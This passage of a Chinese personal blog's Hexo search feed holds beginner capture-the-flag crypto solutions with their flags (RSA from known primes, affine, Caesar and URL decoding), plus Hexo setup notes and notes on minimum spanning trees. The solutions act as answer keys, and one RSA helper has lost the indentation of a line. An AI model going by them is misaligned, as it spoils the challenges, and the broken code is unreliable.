z = 1</span><br><span class="line">print(d)</span><br></pre></td></tr></table></figure><p><img src="/images/%7B398FE444-FE62-474E-8333-9D51EDA83FEB%7D.png"><br>右键<br><img src="/images/Pastedimage20250603090548.png"><br>125631357777427553</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 非对称加密（Asymmetric Cryptography） </category>
          
          <category> RSA </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>eg1</title>
      <link href="/2025/06/c6778b7d8e59.html"/>
      <url>/2025/06/c6778b7d8e59.html</url>
      
        <content type="html"><![CDATA[<p>WGRMcdt{Rxqtsdgncdghxqz}<br>a&#x3D;7,b&#x3D;3<br><img src="/images/%7BFE5A1AA8-8C8C-4C9E-9A01-0878584AC108%7D.png"><br>TZCFlag{Congratulations}</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 替换加密 </category>
          
          <category> 仿射密码(Affine Cipher) </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>p,q,e,c</title>
      <link href="/2025/06/34720d94c3a3.html"/>
      <url>/2025/06/34720d94c3a3.html</url>
      
        <content type="html"><![CDATA[<p>p &#x3D; 3487583947589437589237958723892346254777<br>q &#x3D; 8767867843568934765983476584376578389<br>e &#x3D; 65537<br>cipher &#x3D; 26369494845903294944045520286034018329014599704760363106090278637665342700044</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from sympy import mod_inverse</span><br><span class="line">e = 65537</span><br><span class="line">p = 3487583947589437589237958723892346254777</span><br><span class="line">q = 8767867843568934765983476584376578389</span><br><span class="line">cipher = 26369494845903294944045520286034018329014599704760363106090278637665342700044</span><br><span class="line"></span><br><span class="line">n = p * q #计算模数</span><br><span class="line">phi_n = (p - 1) * (q - 1) #计算欧拉函数</span><br><span class="line"></span><br><span class="line">d = mod_inverse(e, phi_n) #计算私钥d=e^-1 mod ϕ(n)</span><br><span class="line"></span><br><span class="line">m = pow(cipher, d, n) #m=cipher^d mod n使用 pow 函数进行模幂运算，效率更高</span><br><span class="line"></span><br><span class="line">def num_to_ascii(m):</span><br><span class="line">    # 将数字转换为字节流</span><br><span class="line">m_bytes = m.to_bytes((m.bit_length() + 7) // 8, byteorder=&#x27;big&#x27;)</span><br><span class="line">    # 将字节流转换为 ASCII 字符串</span><br><span class="line">    return m_bytes.decode(&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">flag = num_to_ascii(m)</span><br><span class="line">print(f&quot;flag = &#123;flag&#125;&quot;)</span><br></pre></td></tr></table></figure><p> flag&#x3D;TZCFlag{try_rsa}<br><img src="/images/Pastedimage20250603143947.png">）</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 非对称加密（Asymmetric Cryptography） </category>
          
          <category> RSA </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Url编码</title>
      <link href="/2025/06/fd640f926f7d.html"/>
      <url>/2025/06/fd640f926f7d.html</url>
      
        <content type="html"><![CDATA[<p>%66%6c%61%67%7b%61%6e%64%20%31%3d%31%7d<br>flag{and 1&#x3D;1}</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 替换加密 </category>
          
          <category> 凯撒密码(Caesar Cipher) </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>变异凯撒</title>
      <link href="/2025/06/ecdefcda6b13.html"/>
      <url>/2025/06/ecdefcda6b13.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/Pastedimage20250601180351.png"><br><img src="/images/Pastedimage20250601180858.png"><br>ASCII码值<br>f–&gt;102<br>l–&gt;108<br>a–&gt;97<br>g–&gt;103<br><img src="/images/Pastedimage20250601180916.png"><br>每对一位字母进行加密，偏移量依次增加1<br>编写Python代码:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">txt=&#x27;afZ_r9VYfScOeO_UL^RWUc&#x27;</span><br><span class="line">start=5</span><br><span class="line">for i in txt:</span><br><span class="line">    print(chr(ord(i)+start),end=&#x27;&#x27;)</span><br><span class="line">    start+=1</span><br></pre></td></tr></table></figure><p>flag{Caesar_variation}</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 替换加密 </category>
          
          <category> 凯撒密码(Caesar Cipher) </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>看我回旋踢</title>
      <link href="/2025/06/03b0b68e120a.html"/>
      <url>/2025/06/03b0b68e120a.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/Pastedimage20250601021138.png"><br>观察这串密文，我们可以发现开头正好四个字母，并且跟着个括号，这和flag｛｝非常相像，而且题目给我们提示“回旋” 由此我们可以推断出synt是flag经过移位后得到的，这就是凯撒密码。凯撒密码首先选定一个移位数n，比如n&#x3D;3，那么a经过加密后就是d。所以我们在这道题中应该先推测出移位数，s-&gt;f数13次后便得到f，因此移位数就是13，我们可以从网上找到转换器得到结果</p>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
          <category> 替换加密 </category>
          
          <category> 凯撒密码(Caesar Cipher) </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2025/06/c0e0ed6e703e.html"/>
      <url>/2025/06/c0e0ed6e703e.html</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><p>替换图片路径</p><ol><li><strong>搜索</strong>：<code>!\[(.*?)\]\((.*?)\.(png|jpg|jpeg|gif|webp)\)</code><br> （匹配 Markdown 图片语法：<code>![描述](images/路径.png)</code>）</li><li><strong>替换</strong>：<code>![$1](/images/$2.$3)</code><br> （将路径部分替换为 <code>/images/</code> 开头）</li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Rhea的个人博客搭建教程</title>
      <link href="/2025/06/11915e8c8095.html"/>
      <url>/2025/06/11915e8c8095.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/Pastedimage20250612191927.png"></p><ul><li>public 最终所见网页的所有内容</li><li>node_modules 插件以及hexo所需node.js模块</li><li>_config.yml 站点配置文件，设定一些公开信息等</li><li>package.json 应用程序信息，配置hexo运行所需js包</li><li>scaffolds 模板文件夹，新建文章，会默认包含对应模板内容</li><li>themes 存放主题文件，hexo根据主题生成静态网页（速度贼快）</li><li>source 用于存放用户资源（除 <em>posts 文件夹，其余命名方式为 “</em> + 文件名”的文件被忽略）</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s# 开启本地预览服务</span><br></pre></td></tr></table></figure><p><img src="/images/Pastedimage20250612192246.png"></p><p><img src="/images/b8166acda25c9e43f82211f2033095c.png">git clone -b master <a href="https://github.com/jerryc127/hexo-theme-butterfly.git">https://github.com/jerryc127/hexo-theme-butterfly.git</a> themes&#x2F;butterfly<br><strong>操作步骤</strong>：<br>① 新建自定义 CSS：在 <code>themes/butterfly/source/css/</code> 目录创建 <code>transparency.css</code>，写入透明样式：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 页面背景透明 */</span> </span><br><span class="line"><span class="selector-id">#web_bg</span> &#123; <span class="attribute">opacity</span>: <span class="number">0.8</span>; <span class="comment">/* 若主题已设置背景图，可叠加透明：background: rgba(255,255,255,0.8); */</span> &#125; <span class="comment">/* 卡片（文章、侧边栏）透明 */</span> <span class="selector-class">.card-widget</span>, <span class="selector-class">.post-content</span> &#123; <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.9</span>) <span class="meta">!important</span>; &#125;</span><br></pre></td></tr></table></figure><p><a href="https://github.com/denjones/hexo-theme-chan.git">https://github.com/denjones/hexo-theme-chan.git</a><br><img src="/images/Pastedimage20250612205412.png"><br><img src="/images/Pastedimage20250612205824.png"></p><h2 id="二级标题1"><a href="#二级标题1" class="headerlink" title="二级标题1"></a>二级标题1</h2><p>“Live loud, leave a mark.”<br>“Walk alone, walk tall.”</p><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><p>替换图片markdown格式<br>Ctrl + Shift + F<br>Ctrl + Shift + H</p><ul><li>上方：搜索内容（ <code>!\[\[(.*?)\]\]</code>）</li><li>下方：替换内容（<code>![](/assets/images/$1)</code>）</li></ul>]]></content>
      
      
      <categories>
          
          <category> hexo-blog </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>图</title>
      <link href="/2025/06/c3f31b69c914.html"/>
      <url>/2025/06/c3f31b69c914.html</url>
      
        <content type="html"><![CDATA[<h3 id="1-最小生成树概念"><a href="#1-最小生成树概念" class="headerlink" title="1. 最小生成树概念"></a>1. 最小生成树概念</h3><p>生成树概念：</p><blockquote><p><strong>无向图中</strong>，一个<strong>连通图</strong>的最小连通子图称作该图的生成树（不能带环，保持连通，但边要尽可能的少）。<br>有n个顶点的连通图的生成树有n个顶点和<strong>n-1条边</strong>。<br>比如：<br><img src="/images/https:/i-blog.csdnimg.cn/blog_migrate/9d864e26aa58c0192ce2318935b1caa1.png" alt="在这里插入图片描述"></p></blockquote><p>这里的最小其实是指的边的<strong>权值之和最小</strong>，当然是要在保证它是生成树的前提下权值之和最小。<br>所以，对于一个连通图来说，在它的所有的生成树里面，边的权值之和最小的生成树就是该连通图的最小生成树，当然最小生成树也可以有多个，因为边的权值是可以相等的。</p><p>连通图中的每一棵生成树，都是原图的一个<strong>极大无环子图</strong>，即：<strong>从其中删去任何一条边，生成树就不再连通；反之，在其中引入任何一条新边，都会形成一条回路。</strong></p><p>若连通图由n个顶点组成，<strong>&#x3D;&#x3D;则其生成树必含n个顶点和n-1条边&#x3D;&#x3D;</strong>。因此构造最小生成树的准则有三条：</p><ol><li>只能使用图中权值最小的边来构造最小生成树</li><li>只能使用恰好n-1条边来连接图中的n个顶点</li><li>选用的n-1条边不能构成回路</li></ol><p>构造最小生成树的方法：<br>Kruskal算法和Prim算法。<br>这两个算法都采用了逐步求解的贪心策略。</p><p>贪心算法：<br>是指在问题求解时，总是做出当前看起来最好的选择。<br>也就是说贪心算法做出的不是整体最优的的选择，而是某种意义上的局部最优解。<br><strong>贪心算法不是对所有的问题都能得到整体最优解。</strong></p><h3 id="Prim算法（普里姆）"><a href="#Prim算法（普里姆）" class="headerlink" title="&#x3D;&#x3D;Prim算法（普里姆）&#x3D;&#x3D;"></a>&#x3D;&#x3D;Prim算法（普里姆）&#x3D;&#x3D;</h3><p>思想：首先，选一个顶点作为起点，选哪个都可以；然后呢，它在选边的时候把图里面的顶点分成了两个集合，一个集合是已经被选到的结点组成的集合，另一个集合是剩下的结点组成的集合。<br>每次选边的时候是从<strong>两个集合中的顶点直接相连的边中选取权值最小的那一条。</strong></p><p>&#x3D;&#x3D;Kruskal算法（克鲁斯卡尔）&#x3D;&#x3D;<br>算法思想：<br>任给一个有n个顶点的连通图N&#x3D;{V,E}，<br>首先构造一个由这n个顶点组成、不含任何边的图G&#x3D;{V,NULL}，其中每个顶点自成一个连通分量（集合），其次不断从E中取出权值最小的一条边(若有多条权值相等任取其一)，若该边的两个顶点来自不同的连通分量，则将此边加入到G中。如此重复，直到所有顶点在同一个连通分量上为止。<br>核心：每次迭代时，选出一条具有最小权值的边，且边的两端点不在同一连通分量（集合）上，则加入生成树。<br>&#x3D;&#x3D;其实就是每次从图中还未被选到的所有的边里面选出权值最小且不会构成环的边，选够n-1条就完成了，这n-1条边构成的生成树就是该图对应的最小生成树。&#x3D;&#x3D;</p>]]></content>
      
      
      <categories>
          
          <category> Data structure </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
